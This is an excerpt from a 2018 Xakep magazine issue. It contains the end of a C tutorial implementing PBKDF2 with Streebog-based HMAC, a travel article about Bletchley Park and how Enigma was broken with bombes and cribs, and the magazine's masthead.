  uint8_t *HMAC)

На вход идут: указатель на байтовый массив с паролем, длина пароля, ука‐
затель на байтовый мас сив с солью, длина соли и указатель на байтовый мас‐
сив, куда будем записывать результат вычислений.
  Далее произведем дополнение пароля нулями и поксорим результат
дополнения с ipad:


uint8_t internal_1 [2 * BLOCK_SIZE];
uint8_t *internal_2;
uint8_t hash[BLOCK_SIZE];
internal_2 = malloc(BLOCK_SIZE + size_T);
uint8_t K_[BLOCK_SIZE];
memset(K_, 0x00, BLOCK_SIZE);
memcpy(K_, K, size_K);
add_xor_64(K_, i_pad, internal_2);

Присоединим к полученному соль и вычислим значение «стрибог»‐хеша
полученного массива:


memcpy(internal_2 + BLOCK_SIZE, T, size_T);
GetHashString(internal_2, hash, 512, BLOCK_SIZE + size_T);

Поксорим дополненный пароль с opad, соединим с хешем, вычисленным
на предыдущем шаге, и второй раз посчитаем «стрибог»‐хеш. Результат
запишем в HMAC:


add_xor_64(K_, o_pad, internal_1);
memcpy(internal_1 + BLOCK_SIZE, hash, BLOCK_SIZE);
GetHashString(internal_1, HMAC, 512, 2 * BLOCK_SIZE);

Основа функции PBKDF в виде HMAC_GOSTR3411 написана, можно прис‐
тупать к реализации непосредственно самой PBKDF.


PASSWORD-BASED KEY DERIVATION FUNCTION
Первым делом необ ходимо определить количес тво 64‐байтовых блоков
в искомом хеше, для чего установленную ранее длину нужного нам хеша
от пароля и соли делим на 64 и округляем результат до ближайшего целого
в большую сторону (к примеру, если требуемая длина искомого хеша рав‐
на 100  байт,  то  количес тво блоков  будет  равно  двум,  в  стандарте
про округле ние в большую сто рону нап рямую не сказано, однако это надо
иметь в виду). Количество бло ков искомого хеша определяет число циклов,
каждый из которых вклю чает в себя некоторое число итераций C (об этом чис‐
ле мы уже говорили выше).
  Результатом первой  итерации  будет  результат вычисления HMAC_‐
GOSTR3411 от пароля и значения соли с при соединенным к нему значением
текущего номера цик ла в байтовом представлении (напомню, номер цикла
изменяется в пре делах от единицы до N, где N — чис ло блоков в искомом
хеше). Результатом пос ледующих итераций будет результат вычис ления
HMAC_GOSTR3411 от пароля и зна чения HMAC_GOSTR3411, полученного
на предыдущей итерации. Далее результаты каждой итерации побайтно ксо‐
рятся между собой, и в ито ге мы получа ем результат вычислений одного цик‐
ла T(i), где i лежит в пределах от еди ницы до N (число блоков искомого
хеша).





         Схема i‐го цикла функции PBKDF (в данном случае i = 1)


Фун кция вычисления значения первой ите рации для i -го цик ла
Объявим функцию так:


static void
U_first(const uint8_t *password, size_t size_pass,
  const uint8_t *salt, size_t size_salt,
  uint32_t i, uint8_t *U_first_res)

На вход подаем указатель на байтовый массив с паролем, размер этого
пароля, указатель на массив с солью, раз мер соли, номер цикла i, а также
указатель на байтовый мас сив для записи результата. Далее соль и значение
номера цикла (в четырехбайтовом представлении) сливаем в один массив
и считаем HMAC_GOSTR3411 от зна чений пароля и объ единенного мас сива
с солью и номером текущего цикла:


// Формируем массив для объединения соли и номера цикла
uint8_t *internal;
internal = malloc(size_salt + 4); // Поскольку номер цикла в
четырехбайтовом представлении, то размер массива больше длины соли
как раз на четыре
memcpy(internal, salt, size_salt);
// Формируем номер цикла в виде четырех байт
internal[size_salt] = (uint8_t)((i >> 24) & 0xff);
internal[size_salt + 1] = (uint8_t)((i >> 16) & 0xff);
internal[size_salt + 2] = (uint8_t)((i >> 8) & 0xff);
internal[size_salt + 3] = (uint8_t)(i & 0xff);
// Считаем HMAC_GOSTR3411
HMAC_GOSTR3411(password, size_pass, internal, size_salt + 4, U_firs
t_res);


Фун кция вычисления значения последу ющих ите раций для i -го
цик ла
Объявление данной функции выглядит следующим образом:


static void
U_iter(const uint8_t *password, size_t size_pass,
  const uint8_t *U_prev, uint8_t *U_iter_res)

На входе у нас: значение пароля (вернее, ука затель на бай товый массив
с этим значением), длина пароля, указатель на мас сив с результатом пре‐
дыдущей итерации и ука затель на байтовый мас сив для записи результата
работы функции.
  В тело самой функции поместим всего одну строку (что она делает, думаю,
понятно):


HMAC_GOSTR3411(password, size_pass, U_prev, BLOCK_SIZE, U_iter_res);


Ксо рим результаты всех ите раций
Для этого действия объявим функцию F:


static void
F(const uint8_t *password, size_t size_pass, const uint8_t *salt,
  size_t size_salt, uint64_t num_iter, uint32_t block_number,
  uint8_t *F_res)

На вход функции подаем ука затель на мас сив с паролем, длину пароля, ука‐
затель на соль, длину соли, число итераций, номер текущего блока (или
номер текущего цик ла) и указатель на место, куда будем писать результат.
Далее напишем саму функцию:


// Объявляем массивы, необходимые для вычислений
uint8_t T[BLOCK_SIZE];
uint8_t T_[BLOCK_SIZE];
uint8_t internal[BLOCK_SIZE];
// Считаем результат первой итерации
U_first(password, size_pass, salt, size_salt, block_number, T);
memcpy(internal, T, BLOCK_SIZE);
// Считаем результаты последующих операций и ксорим их между собой
for (uint64_t i = 1; i < num_iter; i++){
  U_iter(password, size_pass, internal, internal);
  add_xor_64(internal, T, T_);
  memcpy(T, T_, BLOCK_SIZE);
}
memcpy(F_res, T, BLOCK_SIZE);

Итак, все для того, чтобы проделать один цикл рас чета хеша, у нас есть.
Осталось разобрать, что делать с полученными в каждом цикле результатами
расчета и как из них получить иско мый хеш.


Со бираем результаты расчетов каж дого цик ла и опре деляем
окон чательный хеш
После прохода всех циклов мы получим множес тво значений вида {T(1), T(
2), ..., T(N)}, каждое из которых представляет собой результат вычис‐
лений одного из цик лов. То есть T(1) — результат вычис лений первого цик‐
ла, T(2) — второго и так далее. Чис ло же циклов, напомню, у нас опре деля‐
ется числом 64‐байтовых бло ков в искомом хеше. Для того чтобы из получен‐
ного множества определить нужное нам значение хеша, необходимо прос то
выпол нить конкатенацию всех зна чений T из полученного множества (привес‐
ти все эти значения к одному массиву) и отделить от получившегося массива
столько байтов, какую длину искомого хеша нам надо получить (то есть про‐
извести усечение полученного массива спра ва на лишнее число байтов).





  Конкатенация массивов и усечение до нужного раз мера. DK — нужный
  нам хеш, R — функция усечения)

Исходя из этого, напишем итоговую функцию, которая и будет считать все,
что нам нужно (а имен но значение хеша от пароля и соли). На вход поступают:
указатели на пароль, соль и значения их раз меров; число итераций; нужная
нам длина хеша; указатель, куда помес тим итоговый результат:


void
PBKDF_2(const uint8_t *password, size_t size_pass,
  const uint8_t *salt, size_t size_salt,
  uint64_t num_iter, uint64_t key_length, uint8_t *key)

Определяем количество блоков (и, соответственно, чис ло циклов расчета):


uint32_t num_block = key_length / BLOCK_SIZE;
// Округляем в большую сторону
if ((key_length % BLOCK_SIZE) != 0)
  num_block += 1;

Резервируем нужные места в памяти:


uint8_t F_res[BLOCK_SIZE]; // Массив для хранения результата одной
итерации
uint8_t *DK; // Массив для хранения итогового значения хеша
DK = malloc(num_block * BLOCK_SIZE);

Делаем нужное количество циклов и сливаем резуль таты всех циклов в один
общий длинный массив:


for (uint32_t i = 0; i < num_block; i++){
  F(password, size_pass, salt, size_salt, num_iter, i + 1, F_res);
  memcpy(DK + (i * BLOCK_SIZE), F_res, BLOCK_SIZE);
}

Отсекаем лишнее и пишем результат в нужное мес то:


memcpy(key, DK, key_length);


ЗАКЛЮЧЕНИЕ
Вот и все. Результат работы написанной нами функции PBKDF_2 с исходными
данными из пятого контрольного примера методичес ких рекомендаций
Р 50.1.111—2016 (с. 9) показан на рисунке ниже.





           Время расчета хеша сос тавило порядка 15 секунд

Время расчета хеша при количес тве итераций 4096 составило около пят‐
надцати секунд, что вполне способно очень серь езно усложнить злоумыш‐
леннику подбор пароля как пря мым перебором, так и с помощью «радужных
таблиц» и прочего непотребства.
  Думается, написанная нами функция хеширования паролей на основе
российского алгоритма «Стрибог» наряду с scrypt, bcrypt, crypt, SHA‐2 и про‐
чими алгоритмами подсчета хеша займет свое мес то в твоей кол лекции алго‐
ритмов хеширования паролей, а при выборе алгоритма для своего очеред‐
ного проекта ты будешь знать, что алгоритмам, придуманным за пределами
Российской Федерации, есть вполне достой ная отечественная альтернатива.



        WWW

                     •Код к статье в виде проекта на Qt
                      •Сайт технического комите та по стандартизации
                         ТК‐26 «Криптографическая защита информа‐
                         ции»
    GEEK




 БРУТФОРС
  В АНГЛИЙСКОЙ ГЛУБИНКЕ

   КАК КРИПТОСТОЙКИЕ ШИФРЫ
   ВСКРЫВАЛИ ДО КОМПЬЮТЕРОВ




     Ты наверняка слышал про тест Тьюринга и,
     возможно,  машину  Тьюрин га.  Одна ко,
    помимо   абс трактного   универсального
     вычислителя,  Алан  Тьюринг  придумал
     и вполне реальный — тот, что во время       Андрей Письменный                                                                                              Шеф‐редактор
     Второй   мировой   войны   применялся         apismenny@gmail.com
     для  взлома немецких шифров. О  том,
      как это работало, лучше всего узнать прямо
     на месте  тогдашних  событий,  в  Блет‐
     чли‐парке. Для любителей крип тогра фии
     это практически святая земля. Побывав
     на ней, спешу поделиться с тобой впечат‐
     лениями.


      Почти в любое время года английская деревня выглядит одинаково: зеленые
        луга, коровы, средневекового вида домики и широкое небо — иногда серое,
       иногда — ослепительно‐голубое. Оно как раз переходило от первого режима
        к более редкому второму, когда пригородная электричка мчала меня до стан‐
      ции Блетчли. Сложно предста вить, что в окружении этих живопис ных холмов
       закладывались основы компьютер ной науки и криптографии. Впрочем, про‐
       гул ка по интереснейшему музею развеяла все возможные сомнения.
         Такое живописное мес то, конечно, было выб рано англичанами не случай‐
       но: неприметные бараки с зелеными кры шами, рас положенные в глухой
      деревне, — это как раз то, что было нужно, чтобы спрятать сверхсекретный
      военный объект, где непрерывно трудились над взломом шифров стран
       «оси». Пусть со стороны Блетчли‐парк и не впечат ляет, но та работа, которую
      здесь выполняли, помогла перело мить ход вой ны.


     КРИПТОХАТКИ
     В военные времена в Блетчли‐парк въезжали через главные ворота, предъ‐
       являя охране пропуск, а теперь покупа ют билетик на проходной. Я задер‐
      жался там еще чуть‐чуть, чтобы пос мотреть на при легающий магазин сувени‐
      ров и временную экспозицию, пос вященную технологиям разведки Первой
      мировой (кстати, тоже интерес нейшая тема). Но главное ждало впе реди.
        Собственно Блетчли‐парк — это около двадцати длинных одноэтажных
      построек, которые на английском называ ют hut, а на рус ский обычно перево‐
       дят как «домик». Я про себя называл их «хатками», совмещая одно с дру гим.
     Помимо них, есть особ няк (он же Mansion), где работало командование
      и принимали высоких гос тей, а также несколько вспомогательных построек:
      бывшие конюшни, гараж, жилые дома для персонала.





                                Те самые домики





                              Усадь ба во всей кра се





                     Внутри усадьба выглядит побога че, чем хатки

      У каждого домика — свой номер, причем номера эти имеют историческое
       значение, ты обязательно встретишь их в любом рас сказе о Блетчли‐парке.
     В шестой, к примеру, пос тупали перехваченные сообщения, в восьмом
      занимались криптоанализом (там и работал Алан Тьюринг), в одиннадцатом
       стояли вычислительные машины — «бомбы». Четвертый домик позже выдели‐
      ли под работу над вариантом «Энигмы», который использовался на флоте,
      седьмой — под японскую вариацию на тему «Энигмы» и другие шиф ры,
       в пятом анализировали передачи, перехваченные в Италии, Испании и Пор‐
       тугалии, а также шифровки немецкой полиции. Ну и так далее.





        Это не отряд хипстеров приехал на экскурсию, а велоси педы из сороко‐
          вых. На одном из таких ездил Тьюринг

     Посещать домики можно в любом порядке. Обстановка в большинстве из них
      очень похожая: старая мебель, ста рые вещи, истрепанные тетради, плакаты
      и карты времен Второй мировой. Все это, конечно, не лежало здесь восемь‐
       десят лет: домики сначала переходили от одной государственной организа‐
      ции к другой, потом были заброшены, и толь ко в 2014 году реставраторы
       скрупулезно восстановили их, спася от сно са и превратив в музей.
        К этому, как принято в Англии, подошли не только тщательно, но и
      с выдумкой: во многих комнатах из спрятанных динамиков раздаются голоса
       актеров и звуки, которые создают впечат ление, будто вокруг кипит работа.
      Заходишь и слышишь стук пишущей машин ки, чьи‐то шаги и радио вдалеке,
      а затем «подслушиваешь» оживленный разговор о недавно перехваченной
     шифровке.
        Но настоящая диковинка — это проекции. Например, вот этот мужчина,
      который как бы сидит за столом, поприветство вал меня и вкратце рассказал
      о местных порядках.





       Во многих комнатах царит полумрак — чтобы лучше были видны про‐
        екции

     Интереснее всего, конечно, было посмотреть на рабочий стол Алана Тьюрин‐
        га. Его кабинет находится в восьмом домике и выглядит очень скромно.





                         Автопортрет вышел ненамеренно





                  Пример но так выглядел стол Алана Тьюрин га

      Ну а на само творение Тьюринга — машину для расшифровки «Энигмы» —
     можно взглянуть в доме номер 11 — там же, где в свое время была собрана
      самая первая модель «бомбы».





                               Вокруг — тол па!


     КРИПТОЛОГИЧЕСКАЯ БОМБА
      Возможно, для тебя это будет новостью, но Алан Тьюринг был не первым, кто
      расшифровал «Энигму» методом механичес кого перебора. Его работе пред‐
     шествует исследование польско го криптографа Мариана Реевского. Кстати,
      именно он назвал машину для рас шифровки «бомбой».





        Польская «бомба» была зна читель но проще. Обра ти внимание
        на роторы сверху

     Почему «бомба»? Есть нес колько раз ных вер сий. Например, по одной так
       якобы назывался любимый Реевским и коллегами сорт мороже ного, который
      продавали в кафе неподалеку от бюро шифрования польского генштаба,
      и они позаимствовали это название. Куда более прос тое объ яснение —
       в том, что в польском языке сло во «бомба» может использоваться для вос‐
       клицания вроде «эврика!». Ну и совсем прос той вариант: машина тикала
      подобно бомбе.
        Незадолго до захвата Польши Германией поль ские инже неры передали
       англичанам все наработки, связанные с декоди рованием немецких шиф ров,
       в том числе чер тежи «бомбы», а также работающий экземпляр «Энигмы» —
      не немецкой, а польского кло на, который они успели раз работать до втор‐
       жения. Остальные наработ ки поляков были уничтожены, чтобы разведка Гит‐
      лера ничего не заподозрила.
        Проблема зак лючалась в том, что польский вариант «бомбы» был рассчи‐
       тан только на машину «Энигма I» с тремя фиксированными роторами. Еще до
       начала войны немцы ввели в эксплуата цию усовершенствованные варианты
      «Энигмы», где роторы заменя лись каждый день. Это сделало польский вари‐
       ант полностью непригодным.


                 INFO

                             Если ты смот рел «Игру в имитацию», то уже неп‐
                               лохо  знаком  с  обстановкой  в Блетчли‐парке.
                           Однако режиссер не удержался и сделал нес‐
                                колько отступлений от реальных исторических
                               событий. В частности, Тьюринг не создавал про‐
                                тотип  «бомбы»  собствен норучно  и  никогда
                              не называл ее «Кристофером».





                            Популярный английский актер Криптокод Под‐
                               бирач в роли Алана Тьюрин га


      На основе польской машины и теоретичес ких работ Алана Тьюринга инже‐
      неры British Tabulating Machine Company соз дали те «бомбы», которые пос‐
       тавлялись в Блетчли‐парк и на дру гие секретные объ екты. К концу войны
      машин было уже 210, однако с окончанием военных действий все «бомбы»
       уничтожили по приказу Уинстона Черчилля.
        Зачем британским влас тям понадо билось уничтожать такой прекрасный
       дата‐центр? Дело в том, что «бомба» не является универсальным компьюте‐
      ром — она предназначена исключитель но для декодирования сообщений,
     зашифрованных «Энигмой». Как только нуж да в этом отпала, машины тоже
       стали ненужными, а их компоненты можно было рас продать.
        Другой причиной, возможно, было предчувс твие, что Советский Союз
       в дальнейшем окажется не лучшим дру гом Великобритании. Что, если
       в СССР (или где‐нибудь еще) стали бы исполь зовать технологию, похожую
      на «Энигму»? Тогда лучше никому не демонстри ровать возможность вскры‐
       вать ее шифры быстро и автоматичес ки.
       С военных времен сохранилось только две «бомбы» — они были переданы
       в GCHQ, Центр правительственной связи Великобритании (считай, сов‐
      ременный аналог Блетчли‐парка). Говорят, они были демонтированы в шес‐
       тидесятые годы. Зато в GCHQ милос тиво сог ласились предос тавить музею
       в Блетчли старые чертежи «бомб» — увы, не в лучшем состоянии и не
       целиком. Тем не менее силами энту зиастов их уда лось вос становить, а затем
      создать и несколько реконс трукций. Они‐то сейчас и стоят в музее.
        Занятно, что во время войны на про изводство первой «бомбы» ушло око‐
      ло двенадцати месяцев, а вот реконс трукторы из BCS Computer Conservation
       Society, начав в 1994 году, трудились около двенадцати лет. Что, конечно,
      неудивительно, учитывая, что они не располага ли никакими ресурсами, кро‐
     ме своих сбережений и гаражей.


                                              Продолжение статьи →



}
    GEEK                ← НАЧАЛО СТАТЬИ
         БРУТФОРС В
         АНГЛИЙСКОЙ
            ГЛУБИНКЕ
                КАК КРИПТОСТОЙКИЕ ШИФРЫ ВСКРЫВАЛИ
                             ДО КОМПЬЮТЕРОВ





     КАК РАБОТАЛА «ЭНИГМА»
       Итак, «бомбы» исполь зовались для расшифровки сообщений, которые
       получались на выходе пос ле шифрования «Энигмой». Но как именно она
       это делает? Подробно раз бирать ее электромеха ническую схему мы, конеч‐
       но, не будем, но общий прин цип работы узнать интересно. По крайней мере,
      мне было интересно послушать и записать этот рассказ со слов работника
       музея.





      Устройство «бомбы» во многом обус ловлено устройством самой «Энигмы».
      Собственно, можно считать, что «бомба» — это несколько десятков «Энигм»,
      составленных вместе таким образом, чтобы перебирать воз можные настрой‐
       ки шифровальной машины.
        Самая простая «Энигма» — трехроторная. Она широко применялась
       в вермахте, и ее дизайн предполагал, что ей сможет пользоваться обычный
      солдат, а не математик или инженер. Работа ет она очень прос то: если опе‐
      ратор нажимает, скажем, P, под одной из букв на панели загорится лампочка,
      например под буквой Q. Оста ется только перевес ти в морзянку и передать.
        Важный момент: если нажать P еще раз, то очень мал шанс снова получить
      Q. Потому что каждый раз, ког да ты нажимаешь кнопку, ротор сдвигается
      на одну позицию и меняет конфигурацию электри чес кой схе мы. Такой шифр
      называется полиалфавитным.





      Посмотри на три ротора наверху. Если ты, например, вводишь Q на клавиату‐
       ре, то Q сначала заменится на Y, потом на S, на N, потом отразится (получит‐
       ся K), снова трижды изменится и на выходе будет U. Таким образом, Q будет
      закодирована как U. Но что, если ввес ти U? Получится Q! Значит, шифр сим‐
      метричный. Это было очень удобно для военных применений: если в двух
      местах име лись «Энигмы» с одинако выми настройками, можно было свобод‐
      но передавать сооб щения меж ду ними.
         У этой схемы, правда, есть большой недостаток: при вводе буквы Q из‐за
       отражения в конце ни при каких усло виях нельзя было получить Q. Немецкие
      инженеры знали об этой осо бенности, но не придали ей особого значения,
      а вот британцы нашли возможность экс плуатировать ее.
        Откуда англичанам было известно о внутренностях «Энигмы»? Дело в том,
       что в ее основе лежала совершенно не секретная раз работка. Первый патент
      на нее был подан в 1919 году и описывал машину для банков и финансовых
       организаций, которая поз воляла обменивать ся шифрованными сообщени‐
       ями. Она продавалась на открытом рын ке, и британская разведка успела при‐
      обрести несколько экземпляров. По их же примеру, кстати, была сделана
      и британская шифровальная машина Typex, в которой описанный выше
      недостаток исправлен.





                Самая первая модель Typex. Целых пять роторов!

      Каждый месяц в штабе вермахта составляли таб лицы настроек «Энигмы»
      на каждый день, которые затем рассылали всем пользователям.





      У стандартной «Энигмы» было три ротора, но всего можно было выбрать
       из пяти вариантов и установить каждый из них в любое гнездо. Именно это и
       отражено во вто ром стол бце — номера роторов в том порядке, в котором их
      предполагается ставить в машину. Таким образом, уже на этом этапе можно
      было получить шестьдесят вариантов настро ек.
         Рядом с каждым ротором расположено кольцо с буквами алфавита (в
       некоторых вариантах машины — соответс твующие им числа). Настройки
      для этих колец — в треть ем столбце.
        Самый широкий стол бец — это уже изоб ретение немецких криптографов,
      которого в изначальной «Энигме» не было. Здесь приведены настройки,
      которые задаются при помощи штекерной панели попарным соеди нени ем
        букв. Это запутывает всю схему и превращает ее в непростой пазл.
         Если посмотреть на нижнюю строку нашей таблицы (первое чис ло
       месяца), то настрой ки будут такими: в машину слева направо ставятся роторы
              III, I и IV, кольца рядом с ними выставляются в 18, 24 и 15, а затем на панели
      штекерами соединяются буквы N и P, J и V и так далее.
       С     учетом     всех     этих    факторов     получается     око‐
      ло 107 458 687 327 300 000 000 000 воз можных комбинаций — больше, чем
      прошло секунд с Боль шого взрыва. Неуди витель но, что немцы считали эту
      машину крайне надежной.


                 INFO

                            Существовало множество вариантов «Эниг мы»,
                               в частности на подводных лодках использовался
                              вариант с четырьмя роторами.



    ВЗЛОМ «ЭНИГМЫ»
      Взломать шифр, как водится, позволила ненадежность людей, их ошибки
      и предсказуемость.
         Руководство к «Энигме» говорит, что нуж но выб рать три из пяти роторов.
      Каждая из трех горизонтальных секций «бомбы» может проверять одно воз‐
      можное положение, то есть одна машина единовременно может прогнать три
       из шестидесяти возможных комбинаций. Чтобы проверить все, нужно либо
      двадцать «бомб», либо двадцать последователь ных проверок.
       Однако немцы сделали приятный сюрприз английским криптографам. Они
      ввели правило, по которому одинаковое положение роторов не дол жно пов‐
       торяться в течение месяца, а также в течение двух дней подряд. Звучит так,
      будто это должно было повысить надежность, но в реальности при вело
        к обратному эффекту. Получилось, что к концу месяца количество ком‐
       бинаций, которые нужно было проверять, значительно уменьшалось.
         Вторая вещь, которая помогла в рас шифровке, — это анализ трафика.
       Англичане слушали и записывали шифрованные сообщения армии Гитлера
      с самого начала войны. О рас шифровке тогда речь не шла, но иногда бывает
      важен сам факт коммуника ции плюс такие характеристики, как частота,
      на которой передавалось сообщение, его длина, время дня и так далее. Так‐
      же при помощи триангуляции можно было определить, откуда было отправ‐
      лено сообщение.
         Хороший пример — передачи, которые поступали с Северного моря каж‐
      дый день из одних и тех же локаций, в одно и то же время, на одной и той же
       частоте. Что это могло быть? Ока залось, что это метеорологические суда,
      ежедневно славшие данные о погоде. Какие сло ва могут содержаться в такой
      передаче? Конечно, «прог ноз погоды»! Такие догадки открывают дорогу
      для метода, который сегодня мы называем атакой на основе открытых тек‐
       стов, а в те времена окрестили «подсказ ками» (cribs).
        Поскольку мы знаем, что «Энигма» никогда не дает на выходе те же буквы,
       что были в исходном сообщении, нужно последовательно сопоставить «под‐
       сказку» с каждой подстро кой той же длины и пос мотреть, нет ли совпадений.
      Если нет, то это строка‐кандидат. Например, если мы проверя ем подсказку
       «погода в Бискайском заливе» (Wettervorhersage Biskaya), то сначала выписы‐
      ваем ее напротив шифрованной строки.


       Q F Z W R W I V T Y R E *S* X B F O G K U H Q B A I S E Z
       W E T T E R V O R H E R *S* A G E B I S K A Y A

      Видим, что буква S шифруется сама в себя. Значит, подсказку нужно сдвинуть
      на один символ и проверить снова. В этом случае совпадать будет сразу нес‐
       колько букв — двигаем еще. Совпадает R. Двигаем еще дважды, пока
      не наталкиваемся на потенциально пра вильную подс троку.
         Если бы мы имели дело с шифром подстановки, то на этом можно было бы
      и закончить. Но поскольку это полиалфавитный шифр, нам нужны настрой ки
      и  исходные  положения  роторов  «Энигмы». Именно  их  и  под бирали
      при помощи «бомб». Для это го пары букв нужно сначала пронуме ровать.


       1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23
       R  W  I  V  T  Y  R  E  S  X  B  F  O  G  K  U  H  Q  B  A  I  S  E
       W  E  T  T  E  R  V  O  R  H  E  R  S  A  G  E  B  I  S  K  A  Y  A

      А затем на основе этой таб лицы составить так называемое «меню» — схему,
      по которой видно, какая буква исходного сообщения (то есть «под сказ ки»)
       в какую букву предположительно шифруется и в какой позиции. По этой схе ме
      и настраивается «бомба».





      Каждый из барабанов может принять одно из 26 положений — по одному
      на каждую перебираемую букву алфавита. За каждым из барабанов — 26 кон‐
        тактов, которые тол стыми шлейфами соединяются таким образом, чтобы
      машина искала настройки штекерной панели, дающие последовательные
      совпадения букв шифрованной стро ки с подсказ кой.





                    «Бомба» сзади — впечатляющее зрелище

      Поскольку строение «бомбы» не учитывает устрой ство коммутаций внутри
      «Энигмы», она по ходу работы выдает несколь ко вариантов, которые опе‐
      ратор должен проверить. Часть из них не подойдет прос то потому, что
       в «Энигме» к одному гнезду можно подключить только один штекер. Если нас‐
      тройки не подходят, оператор запус кает машину снова, чтобы получить сле‐
      дующий вариант.
        Примерно за пятнадцать минут «бомба» переберет все варианты для выб‐
      ранной позиции барабанов. Если она угадана верно, то остается подобрать
      настройки колец — уже без автоматики (не будем погружаться в подробнос‐
         ти). Затем на модифициро ванных для совместимос ти с «Энигмой» английских
      машинах Typex шифровки перево дили в чистый текст.
         Таким образом, оперируя целым парком из «бомб», британцы к концу вой‐
      ны каждый день получали акту альные настройки еще до завтрака. Всего
        у немцев было около полусотни каналов, по многим из которых передавались
       гораздо более интересные вещи, чем прог ноз погоды.


     Раз реша ется тро гать руками
     В музее Блетчли‐парка можно не только смотреть по сторонам, но и прикос‐
       нуться к дешифровке собственноручно. В том числе — при помощи сто‐
       лов‐тачскринов. Каждый из них дает свое задание.





     В этом, например, предлагается совмещать листы Банбури (Banburismus).
      Это ранний метод дешифровки «Энигмы», который применялся до создания
       «бомб». Увы, таким спо собом рас шифровать что‐то в течение суток было
      невозможно, а в пол ночь все успехи превращались в тыкву из‐за очередной
      смены настроек.



    МУЛЯЖ «ДАТА-ЦЕНТРА» В HUT 11
      Что же стоит в домике номер 11, где раньше была «серверная», если все
      «бомбы» были уничтожены в прошлом веке? Чес тно говоря, я все же в глу‐
      бине души надеялся зайти сюда и обнаружить все в том же виде, что и ког‐
       да‐то. Увы, нет, но зал все равно не пустует.





      Здесь  стоят  вот  такие железные  конструкции  с фанерными  лис тами.
      На одних — фотографии «бомб» в натуральную величину, на дру гих — цитаты
       из рассказов тех, кто здесь работал. Ими были в основном женщины, в том
       числе из WAF — женской службы ВВС Великоб ритании. Цитата на снимке
       говорит нам о том, что переключение шлейфов и присмотр за «бомбами» был
      вовсе не легкой задачей, а изматывающим ежедневным трудом.
         Кстати, между муляжа ми спря тана очередная серия проекций. Девушка
      рассказывает сво ей подруге о том, что понятия не имела, где ей предстоит
       служить, и полностью поражена происхо дящим в Блетчли. Что ж, я был тоже
      поражен необычным экспо натом!


     ДРУГИЕ ИНТЕРЕСНЫЕ ВЕЩИ
     В общей сложности я провел в Блетчли‐парке пять часов. Этого едва‐едва
       хватило, чтобы хорошень ко посмотреть централь ную часть и мельком — все
       остальное. Было настоль ко интересно, что я даже не заметил, как прошло
      время, пока ноги не начали ныть и проситься обратно — если не в гостиницу,
       то хотя бы в электричку.
        А помимо домиков, полутемных кабинетов, восстановленных «бомб»
      и длинных стендов с сопроводитель ными тек стами, было на что посмотреть.
      Про зал, посвященный шпиона жу во время Первой мировой, я уже упомянул.
      Был еще зал про дешифровку «Лоренца» (я как‐то писал об этом старшем
      брате «Энигмы» в рубрику WWW) и соз дание компь юте ра Colossus. Кстати,
       в музее я обнаружил и сам «Колосс», вернее ту часть, что успе ли построить
      реконструкторы.
        Самых выносливых уже за территорией Блетчли‐парка ждет небольшой
      музей компьютерной истории, где можно ознакомиться с тем, как вычис‐
       лительная техника развивалась пос ле Тьюринга. Туда я тоже заглянул,
      но прошел уже быстрым шагом. На BBC Micro и «Спектрумы» я уже нас‐
      мотрелся в других местах — ты можешь сделать это, например, на питерском
      фестивале Chaos Constructions. А вот живую «бомбу» где попало не встре‐
       тишь!





          После «бомб» и «Колосса» это все выглядит как страшный новодел


     Лон дон ские музеи для гика
      Если соберешься посетить Лондон, то в дополнение к Блетчли‐парку я
      рекомендую еще два музея. Начать лучше всего с блестяще сделанного
      военного музея (Imperial War Museum), а закончить — музе ем науки. Вот уж
       где роскошная кол лекция компь ютеров всех времен. Есть даже машина Бэб‐
       биджа... да что там, есть даже мозг Бэббиджа в стеклянной банке!





}
   №06 (231)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Глав ный редактор       Выпускающий редактор         Шеф‐редак тор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Ев гений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по подписке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Друж бы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколам ское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязательно сов пада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редак ция
не несет ответственности за содер жание рекламных объ явлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018